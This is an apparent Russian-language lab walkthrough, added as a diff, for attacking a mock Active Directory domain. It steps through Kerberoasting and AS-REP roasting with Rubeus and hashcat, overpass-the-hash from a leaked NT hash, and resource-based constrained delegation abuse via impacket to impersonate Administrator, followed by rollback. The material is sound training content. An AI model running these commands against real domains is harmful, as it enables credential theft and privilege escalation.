@@ -1,0 +1,347 @@
+Пароль `jdoe` нужен только для первого входа. В отчёте его нет — возьми его из интерфейса лаборатории.
+
+## Этап 0. Проверка подключения
+
+На своём Windows-компьютере:
+
+```
+Test-NetConnection 127.0.0.1 -Port 2225
+```
+
+Должно быть:
+
+```
+TcpTestSucceeded : True
+```
+
+Теперь подключись:
+
+```
+ssh -p 2225 jdoe@127.0.0.1
+```
+
+Внутри VM проверь:
+
+```
+whoami
+hostname
+ipconfig
+```
+
+Ожидается примерно:
+
+```
+thornbury\jdoe
+THORNBURY-DC01
+10.0.2.15
+```
+
+В файл `thornbury-notes.txt` запиши:
+
+```
+Foothold: thornbury\jdoe
+Host: THORNBURY-DC01
+IP: 10.0.2.15
+SSH: 127.0.0.1:2225
+```
+
+## Этап 1. Kerberoasting
+
+Смысл: `svc_reports` — сервисный аккаунт. У него есть SPN. Домен выдаёт Kerberos-ticket любому авторизованному пользователю, а внутри ticket есть материал для проверки пароля.
+
+Это не вход под `svc_reports`. Сначала мы только получаем его ticket.
+
+Передай `Rubeus.exe` на VM:
+
+```
+scp -P 2225 .\Rubeus.exe jdoe@127.0.0.1:C:/Users/jdoe/Rubeus.exe
+```
+
+В SSH-сессии:
+
+```
+cd C:\Users\jdoe
+.\Rubeus.exe kerberoast /user:svc_reports /enctype:rc4 /outfile:kerberoast.txt
+type .\kerberoast.txt
+```
+
+Проверь, что строка начинается так:
+
+```
+$krb5tgs$23$
+```
+
+Число `23` означает RC4. Именно для него Hashcat использует режим `13100`.
+
+Скопируй файл на компьютер:
+
+```
+scp -P 2225 jdoe@127.0.0.1:C:/Users/jdoe/kerberoast.txt .
+```
+
+Создай `thornbury_words.txt`, например:
+
+```
+Thornbury
+ThornburyMutual
+Mutual
+Insurance
+Insurer
+Reports
+Claims
+2016
+2017
+ThornburyMutual2016!
+ClaimsIntake2017!
+```
+
+Запусти Hashcat:
+
+```
+hashcat.exe -m 13100 -a 0 .\kerberoast.txt .\thornbury_words.txt
+```
+
+Показать найденный пароль:
+
+```
+hashcat.exe -m 13100 .\kerberoast.txt --show
+```
+
+В заметки запиши:
+
+```
+Account: svc_reports
+Attack: Kerberoasting
+Hash type: TGS-REP RC4
+Hashcat mode: 13100
+Recovered password: ...
+```
+
+Если видишь `Exhausted`, это значит, что нужного слова нет в словаре.
+
+Теперь прочитай флаг через Windows PowerShell:
+
+```
+$cred = Get-Credential 'THORNBURY\svc_reports'
+New-PSDrive -Name R -PSProvider FileSystem `
+  -Root '\\thornbury-dc01\svc_reports_home$' `
+  -Credential $cred
+
+Get-Content R:\flag_roast.txt
+```
+
+## Этап 2. AS-REP roasting
+
+`mreynolds` настроен с флагом `DoesNotRequirePreAuth`. Поэтому DC выдаёт ему AS-REP без предварительной проверки пароля.
+
+В SSH-сессии:
+
+```
+.\Rubeus.exe asreproast `
+  /user:mreynolds `
+  /format:hashcat `
+  /outfile:asrep.txt
+
+type .\asrep.txt
+```
+
+Хэш должен начинаться примерно так:
+
+```
+$krb5asrep$23$
+```
+
+Скопируй его на компьютер:
+
+```
+scp -P 2225 jdoe@127.0.0.1:C:/Users/jdoe/asrep.txt .
+```
+
+Подбор:
+
+```
+hashcat.exe -m 18200 -a 0 .\asrep.txt .\thornbury_words.txt
+hashcat.exe -m 18200 .\asrep.txt --show
+```
+
+Почему режим другой:
+
+```
+Kerberoast = TGS-REP = 13100
+AS-REP roast = AS-REP = 18200
+```
+
+После нахождения пароля:
+
+```
+$cred = Get-Credential 'THORNBURY\mreynolds'
+New-PSDrive -Name M -PSProvider FileSystem `
+  -Root '\\thornbury-dc01\mreynolds_home$' `
+  -Credential $cred
+
+Get-Content M:\flag_asrep.txt
+```
+
+## Этап 3. Подключение без пароля
+
+Это не означает, что Windows вообще не использует секрет. Используется не пароль, а NT-хэш.
+
+Сначала прочитай публичный файл:
+
+```
+Get-Content '\\thornbury-dc01\Public\migration_notes.txt'
+```
+
+Найди NT-хэш `d.langford`.
+
+Механизм такой:
+
+```
+NT-хэш
+   ↓
+Kerberos RC4-ключ
+   ↓
+запрос TGT у DC
+   ↓
+Kerberos-ticket d.langford
+   ↓
+доступ к ITAdmin$
+```
+
+Запрос TGT:
+
+```
+.\Rubeus.exe asktgt `
+  /user:d.langford `
+  /domain:thornbury.local `
+  /rc4:HASH_D_LANGFORD `
+  /ptt
+```
+
+Проверь ticket:
+
+```
+klist
+```
+
+Теперь:
+
+```
+Get-Content '\\thornbury-dc01\ITAdmin$\flag_altauth.txt'
+```
+
+`whoami` может по-прежнему показать `jdoe`. Это нормально: Rubeus установил Kerberos-ticket, но не поменял пользователя локального процесса.
+
+В заметки:
+
+```
+Identity: d.langford
+Material: NT hash
+Plaintext password: not recovered
+Technique: overpass-the-hash / pass-the-ticket
+Proof: access to ITAdmin$
+```
+
+## Этап 4. RBCD
+
+Перед изменением обязательно запиши исходное состояние:
+
+```
+Get-ADUser svc_sql01 `
+  -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+Связь в AD:
+
+```
+svc_reports -- GenericAll --> svc_sql01
+```
+
+Это позволяет изменить:
+
+```
+msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+То есть сказать:
+
+> `svc_sql01` должен доверять билетам, которые представляет `svc_reports`.
+
+Для этой части удобнее WSL2:
+
+```
+wsl --install -d Ubuntu
+```
+
+В Ubuntu:
+
+```
+sudo apt update
+sudo apt install -y python3-impacket
+```
+
+Проверка доступности DC:
+
+```
+ping 10.0.2.15
+```
+
+Запись RBCD:
+
+```
+rbcd.py \
+  -action write \
+  -delegate-from svc_reports \
+  -delegate-to svc_sql01 \
+  -dc-ip 10.0.2.15 \
+  thornbury.local/svc_reports
+```
+
+Затем S4U-цепочка:
+
+```
+getST.py \
+  -spn MSSQLSvc/thornbury-sql01.thornbury.local:1433 \
+  -impersonate Administrator \
+  -dc-ip 10.0.2.15 \
+  thornbury.local/svc_reports
+```
+
+Здесь важно:
+
+- использовать DNS-имя, а не IP;
+- SPN должен совпадать с `MSSQLSvc/thornbury-sql01...`;
+- SQL mock service принимает только Kerberos;
+- обычный NTLM pass-the-hash здесь не сработает.
+
+После получения `.ccache`:
+
+```
+export KRB5CCNAME=ИМЯ_ПОЛУЧЕННОГО_CCACHE
+klist
+```
+
+Затем используй Kerberos-клиент лаборатории для подключения к сервису на TCP `1433`.
+
+После получения флага откати изменение:
+
+```
+rbcd.py \
+  -action remove \
+  -delegate-from svc_reports \
+  -delegate-to svc_sql01 \
+  -dc-ip 10.0.2.15 \
+  thornbury.local/svc_reports
+```
+
+Проверь:
+
+```
+rbcd.py \
+  -action read \
+  -delegate-to svc_sql01 \
+  -dc-ip 10.0.2.15 \
+  thornbury.local/svc_reports
+```
+
+Главное правило: после каждого этапа записывай команду, полученный материал, найденный пароль/хэш, путь к флагу и сделанное изменение. Не переходи к следующему этапу, пока текущий не подтверждён.
